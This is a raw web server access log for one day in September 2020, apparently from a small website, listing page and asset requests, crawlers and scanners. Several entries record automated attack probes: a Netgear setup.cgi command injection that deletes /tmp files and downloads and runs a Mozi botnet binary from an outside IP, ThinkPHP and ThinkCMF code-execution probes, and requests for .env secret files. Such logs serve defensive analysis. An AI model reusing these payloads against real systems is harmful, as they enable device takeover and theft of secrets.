::ffff:127.0.0.1 - - [28/Sep/2020:13:46:33 +0000] "GET / HTTP/1.1" 200 62517 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15"
::ffff:127.0.0.1 - - [28/Sep/2020:13:46:33 +0000] "GET /web_assets/assets/css/slick-theme.css HTTP/1.1" 200 3294 "http://swiftbullhead.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15"
::ffff:127.0.0.1 - - [28/Sep/2020:13:46:33 +0000] "GET /web_assets/assets/css/slick.css HTTP/1.1" 200 1776 "http://swiftbullhead.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15"
::ffff:127.0.0.1 - - [28/Sep/2020:13:46:33 +0000] "GET /web_assets/assets/fonts/fonts.css HTTP/1.1" 200 1444 "http://swiftbullhead.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15"
::ffff:127.0.0.1 - - [28/Sep/2020:13:46:33 +0000] "GET /web_assets/assets/css/bootstrap.min.css HTTP/1.1" 200 144877 "http://swiftbullhead.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15"
::ffff:127.0.0.1 - - [28/Sep/2020:13:46:33 +0000] "GET /web_assets/assets/css/custom-2.css HTTP/1.1" 200 43190 "http://swiftbullhead.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15"
::ffff:127.0.0.1 - - [28/Sep/2020:13:46:33 +0000] "GET /web_assets/assets/css/material-form.css HTTP/1.1" 200 2264 "http://swiftbullhead.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15"
::ffff:127.0.0.1 - - [28/Sep/2020:13:46:33 +0000] "GET /web_assets/assets/css/responsive.css HTTP/1.1" 200 7186 "http://swiftbullhead.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15"
::ffff:127.0.0.1 - - [28/Sep/2020:13:46:33 +0000] "GET /web_assets/assets/js/jquery-1.9.1.min.js HTTP/1.1" 200 92629 "http://swiftbullhead.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15"
::ffff:127.0.0.1 - - [28/Sep/2020:13:46:33 +0000] "GET /web_assets/assets/js/bootstrap.min.js HTTP/1.1" 200 48944 "http://swiftbullhead.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15"
::ffff:127.0.0.1 - - [28/Sep/2020:13:46:34 +0000] "GET /web_assets/assets/js/slick.min.js HTTP/1.1" 200 42863 "http://swiftbullhead.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15"
::ffff:127.0.0.1 - - [28/Sep/2020:13:46:34 +0000] "GET /web_assets/assets/js/custom.js HTTP/1.1" 200 5717 "http://swiftbullhead.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15"
::ffff:127.0.0.1 - - [28/Sep/2020:13:46:34 +0000] "GET /web_assets/assets/js/material-form.js HTTP/1.1" 200 631 "http://swiftbullhead.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15"
::ffff:127.0.0.1 - - [28/Sep/2020:13:46:34 +0000] "GET /web_assets/assets/js/validation.js HTTP/1.1" 200 89138 "http://swiftbullhead.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15"
::ffff:127.0.0.1 - - [28/Sep/2020:13:46:34 +0000] "GET /web_assets/assets/img/logo.png HTTP/1.1" 304 - "http://swiftbullhead.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15"
::ffff:127.0.0.1 - - [28/Sep/2020:13:46:34 +0000] "GET /web_assets/assets/img/green-img/icon-green-6.png HTTP/1.1" 304 - "http://swiftbullhead.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15"
::ffff:127.0.0.1 - - [28/Sep/2020:13:46:34 +0000] "GET /web_assets/assets/img/green-img/icon-green-10.png HTTP/1.1" 304 - "http://swiftbullhead.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15"
::ffff:127.0.0.1 - - [28/Sep/2020:13:46:34 +0000] "GET /web_assets/assets/img/green-img/icon-green-8.png HTTP/1.1" 304 - "http://swiftbullhead.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15"
::ffff:127.0.0.1 - - [28/Sep/2020:13:46:34 +0000] "GET /web_assets/assets/img/green-img/icon-green-12.png HTTP/1.1" 304 - "http://swiftbullhead.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15"
::ffff:127.0.0.1 - - [28/Sep/2020:13:46:34 +0000] "GET /web_assets/assets/img/green-img/icon-green-13.png HTTP/1.1" 304 - "http://swiftbullhead.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15"
::ffff:127.0.0.1 - - [28/Sep/2020:13:46:34 +0000] "GET /web_assets/assets/img/green-img/icon-green-7.png HTTP/1.1" 304 - "http://swiftbullhead.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15"
::ffff:127.0.0.1 - - [28/Sep/2020:13:46:34 +0000] "GET /web_assets/assets/css/fonts/slick.woff HTTP/1.1" 404 177 "http://swiftbullhead.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15"
::ffff:127.0.0.1 - - [28/Sep/2020:13:46:34 +0000] "GET /web_assets/assets/img/green-img/scooter.png HTTP/1.1" 304 - "http://swiftbullhead.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15"
::ffff:127.0.0.1 - - [28/Sep/2020:13:46:34 +0000] "GET /web_assets/assets/img/green-img/icon-green-11.png HTTP/1.1" 304 - "http://swiftbullhead.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15"
::ffff:127.0.0.1 - - [28/Sep/2020:13:46:34 +0000] "GET /web_assets/assets/img/green-img/icon-green-2.png HTTP/1.1" 304 - "http://swiftbullhead.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15"
::ffff:127.0.0.1 - - [28/Sep/2020:13:46:34 +0000] "GET /web_assets/assets/img/green-img/icon-green-1.png HTTP/1.1" 304 - "http://swiftbullhead.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15"
::ffff:127.0.0.1 - - [28/Sep/2020:13:46:35 +0000] "GET /web_assets/assets/img/green-img/icon-green-5.png HTTP/1.1" 304 - "http://swiftbullhead.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15"
::ffff:127.0.0.1 - - [28/Sep/2020:13:46:35 +0000] "GET /web_assets/assets/img/green-img/icon-green-4.png HTTP/1.1" 304 - "http://swiftbullhead.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15"
::ffff:127.0.0.1 - - [28/Sep/2020:13:46:35 +0000] "GET /web_assets/assets/img/mobile11.png HTTP/1.1" 304 - "http://swiftbullhead.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15"
::ffff:127.0.0.1 - - [28/Sep/2020:13:46:35 +0000] "GET /web_assets/assets/img/ic_app_store.png HTTP/1.1" 304 - "http://swiftbullhead.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15"
::ffff:127.0.0.1 - - [28/Sep/2020:13:46:35 +0000] "GET /web_assets/assets/css/fonts/slick.ttf HTTP/1.1" 404 176 "http://swiftbullhead.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15"
::ffff:127.0.0.1 - - [28/Sep/2020:13:46:35 +0000] "GET /web_assets/assets/img/ic_google_pay.png HTTP/1.1" 304 - "http://swiftbullhead.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15"
::ffff:127.0.0.1 - - [28/Sep/2020:13:46:35 +0000] "GET /web_assets/assets/css/ajax-loader.gif HTTP/1.1" 404 176 "http://swiftbullhead.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15"
::ffff:127.0.0.1 - - [28/Sep/2020:13:46:35 +0000] "GET /web_assets/assets/css/fonts/slick.svg HTTP/1.1" 404 176 "http://swiftbullhead.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15"
::ffff:127.0.0.1 - - [28/Sep/2020:14:07:59 +0000] "GET / HTTP/1.1" 200 62517 "-" "Mozilla/5.0"
::ffff:167.71.210.72 - - [28/Sep/2020:15:02:10 +0000] "GET / HTTP/1.0" 200 62517 "-" "-"
::ffff:127.0.0.1 - - [28/Sep/2020:15:24:32 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "http://swiftbullhead.com/designs/Email-Template-new/index4.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
::ffff:127.0.0.1 - - [28/Sep/2020:15:28:10 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "http://swiftbullhead.com/designs/defy-new/index.html" "Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-A305F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Mobile Safari/537.36"
::ffff:127.0.0.1 - - [28/Sep/2020:15:30:54 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "http://swiftbullhead.com/designs/Email-Template-new/index4.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
::ffff:127.0.0.1 - - [28/Sep/2020:15:30:58 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "http://swiftbullhead.com/designs/Email-Template-new/index4.html" "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
::ffff:127.0.0.1 - - [28/Sep/2020:15:48:29 +0000] "GET / HTTP/1.1" 200 62517 "-" "Linux Mozilla 7.0"
::ffff:127.0.0.1 - - [28/Sep/2020:16:17:58 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://123.235.222.199:55416/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.1" 404 148 "-" "-"
::ffff:127.0.0.1 - - [28/Sep/2020:16:54:04 +0000] "GET / HTTP/1.1" 200 62517 "-" "-"
::ffff:127.0.0.1 - - [28/Sep/2020:16:54:04 +0000] "GET / HTTP/1.1" 200 62517 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:127.0.0.1 - - [28/Sep/2020:17:08:53 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "PageThing.com"
::ffff:127.0.0.1 - - [28/Sep/2020:17:08:53 +0000] "HEAD / HTTP/1.1" 200 62517 "-" "PageThing.com"
::ffff:127.0.0.1 - - [28/Sep/2020:17:53:53 +0000] "GET / HTTP/1.1" 200 62517 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko; compatible; BW/1.1; bit.ly/2W6Px8S) Chrome/84.0.4147.105 Safari/537.36"
::ffff:127.0.0.1 - - [28/Sep/2020:17:53:53 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko; compatible; BW/1.1; bit.ly/2W6Px8S) Chrome/84.0.4147.105 Safari/537.36"
::ffff:127.0.0.1 - - [28/Sep/2020:18:19:43 +0000] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:127.0.0.1 - - [28/Sep/2020:18:20:07 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [28/Sep/2020:18:20:08 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [28/Sep/2020:18:34:29 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 62517 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:127.0.0.1 - - [28/Sep/2020:18:45:08 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [28/Sep/2020:18:45:08 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:209.17.97.26 - - [28/Sep/2020:18:51:10 +0000] "GET / HTTP/1.1" 200 62517 "-" "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
::ffff:127.0.0.1 - - [28/Sep/2020:18:53:08 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 62517 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:127.0.0.1 - - [28/Sep/2020:18:56:58 +0000] "GET / HTTP/1.1" 200 62517 "-" "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
::ffff:127.0.0.1 - - [28/Sep/2020:19:04:54 +0000] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1" 404 148 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:127.0.0.1 - - [28/Sep/2020:21:18:59 +0000] "GET / HTTP/1.1" 200 62517 "-" "libwww-perl/6.47"
::ffff:209.17.96.146 - - [28/Sep/2020:22:37:06 +0000] "GET / HTTP/1.0" 200 62517 "-" "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
::ffff:127.0.0.1 - - [28/Sep/2020:22:47:37 +0000] "POST /api/jsonws/invoke HTTP/1.1" 404 157 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:127.0.0.1 - - [28/Sep/2020:23:35:55 +0000] "GET / HTTP/1.1" 200 62517 "-" "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
